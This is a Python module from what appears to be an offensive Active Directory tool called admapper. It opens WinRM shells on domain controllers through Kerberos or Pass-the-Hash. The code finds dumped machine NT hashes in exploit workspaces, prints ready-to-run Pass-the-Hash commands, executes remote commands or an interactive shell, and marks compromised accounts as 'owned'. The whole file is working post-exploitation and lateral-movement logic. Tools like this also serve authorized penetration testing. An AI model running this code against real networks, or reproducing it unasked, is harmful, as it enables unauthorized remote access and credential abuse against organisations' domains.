from __future__ import annotations

from pathlib import Path

import typer

from admapper.support.output import print_error, print_info, print_success
from admapper.creds.common import resolve_dc_fqdn
from admapper.creds.time_sync import ensure_dc_clock
from admapper.postex.creds import machine_hash_from_workspace
from admapper.winrm.client import WinRMClient, WinRMError
from admapper.winrm.deps import winrm_deps_hint


def _workspace_paths_for_dc(dc_ip: str) -> list[Path]:
    slug = f"target-{dc_ip.replace('.', '-')}"
    bases = [
        Path.cwd() / "workspaces",
        Path.home() / ".admapper" / "workspaces",
        Path.home() / "Projects" / "admapper" / "workspaces",
    ]
    found: list[Path] = []
    for base in bases:
        if not base.is_dir():
            continue
        candidate = base / slug
        if candidate.is_dir():
            found.append(candidate)
        for ws in sorted(base.iterdir()):
            if ws.is_dir() and (ws / "exploit_log.json").is_file():
                found.append(ws)
    seen: set[str] = set()
    unique: list[Path] = []
    for path in found:
        key = str(path.resolve())
        if key not in seen:
            seen.add(key)
            unique.append(path)
    return unique


def _machine_hash_hint(dc_ip: str) -> tuple[str, str] | None:
    for ws_path in _workspace_paths_for_dc(dc_ip):
        found = machine_hash_from_workspace(ws_path)
        if found:
            return found
    return None


def _warn_protected_user_winrm(*, domain: str, username: str, dc_ip: str) -> None:
    from admapper.creds.auth_checks import is_protected_user

    if not is_protected_user(username, {username.lower()}):
        return
    print_error(f"{username} is a Protected User — Kerberos WinRM to DC often fails.")
    machine = _machine_hash_hint(dc_ip)
    if machine:
        from admapper.creds.common import format_admapper_winrm_pth

        account, nthash = machine
        _, cmd = format_admapper_winrm_pth(
            account=account,
            nthash=nthash,
            domain=domain,
            ws_path=None,
            fallback_ip=dc_ip if dc_ip and dc_ip[0].isdigit() else None,
        )
        print_success("Use the workspace machine hash on its WinRM host:")
        print_info(f"  {cmd}")
    else:
        print_info("  admapper exploit -w <workspace>   # then WinRM with dumped machine hash")
    raise typer.Exit(1)


def run_winrm_shell(
    *,
    host: str | None,
    domain: str,
    username: str,
    password: str | None,
    nthash: str | None,
    dc_ip: str | None,
    dc_fqdn: str | None,
    command: str | None,
    ccache: Path | None,
    clock_skew: str | None,
    sync_clock: bool = True,
    verbose: bool = False,
    auto: bool = False,
) -> None:
    if nthash:
        if not host:
            print_error("Provide -H <target_host> for Pass-the-Hash WinRM")
            raise typer.Exit(1)
        connect_host = host.rstrip(".")
        dc = dc_ip or connect_host
        dc_hostname = dc_fqdn or connect_host
    else:
        dc = dc_ip or host
        if not dc or (host and not host[0].isdigit() and not dc_ip):
            print_error("Provide --dc-ip <DC_IP> (required for Kerberos WinRM)")
            raise typer.Exit(1)
        connect_host = domain.lower().rstrip(".")
        if host and not host[0].isdigit():
            connect_host = host.rstrip(".")
        dc_hostname = dc_fqdn or resolve_dc_fqdn(None, domain, fallback_ip=dc) or f"DC01.{domain.lower()}"

    if not nthash and password:
        _warn_protected_user_winrm(domain=domain, username=username, dc_ip=dc)

    if sync_clock and not nthash:
        ensure_dc_clock(dc, enabled=True)

    if nthash:
        method = "nthash"
        print_info("Pass-the-Hash WinRM via nxc (machine accounts)")
    elif ccache:
        method = "ccache"
    else:
        method = WinRMClient.macos_recommended_method()
        print_info("Kerberos WinRM via pypsrp")

    client = WinRMClient(
        connect_host,
        domain=domain,
        username=username,
        password=password,
        dc_ip=dc,
        dc_fqdn=dc_hostname,
        ticket_method=method,
        ccache=ccache,
        clock_skew=clock_skew,
        verbose=verbose,
        nthash=nthash,
    )

    try:
        if command:
            result = client.execute(command)
            if result.stdout:
                typer.echo(result.stdout.rstrip())
            if result.stderr:
                print_error(result.stderr.rstrip())
            if result.returncode != 0:
                raise typer.Exit(result.returncode)
            print_success(f"WinRM OK ({result.shell})")
            if auto:
                _auto_mark_owned(domain=domain, username=username, dc_ip=dc)
        else:
            client.interactive_shell()
            _auto_mark_owned(domain=domain, username=username, dc_ip=dc)
    except WinRMError as exc:
        print_error(str(exc))
        print_info(winrm_deps_hint())
        machine = _machine_hash_hint(dc)
        if machine and not nthash:
            account, h = machine
            print_info(
                f"try machine PTH: admapper winrm -H {dc} -d {domain} -u '{account}' --hash {h}"
            )
        raise typer.Exit(1) from exc


def _auto_mark_owned(*, domain: str, username: str, dc_ip: str | None) -> None:
    """Best-effort: mark user as owned in the workspace after successful WinRM."""
    try:
        from admapper.support.session import Session
        from admapper.escalate.analyze import mark_user_owned

        session = Session.bootstrap()
        # Locate workspace for this target
        slug = f"target-{dc_ip.replace('.', '-')}" if dc_ip and dc_ip[0].isdigit() else None
        ws_name: str | None = None
        if slug:
            for name in session.workspaces.list_workspaces():
                if slug in name:
                    ws_name = name
                    break
        if not ws_name:
            # Fall back to first workspace that has this domain
            for name in session.workspaces.list_workspaces():
                session.select_workspace(name)
                if session.workspace and session.workspace.domain and session.workspace.domain.lower() == domain.lower():
                    ws_name = name
                    break
        if ws_name:
            session.select_workspace(ws_name)
            if session.workspace:
                mark_user_owned(session, username, refresh=True)
                print_success(f"auto-owned: {username} → pwned en workspace {ws_name}")
    except Exception as exc:
        print_info(f"auto-owned skip: {exc}")

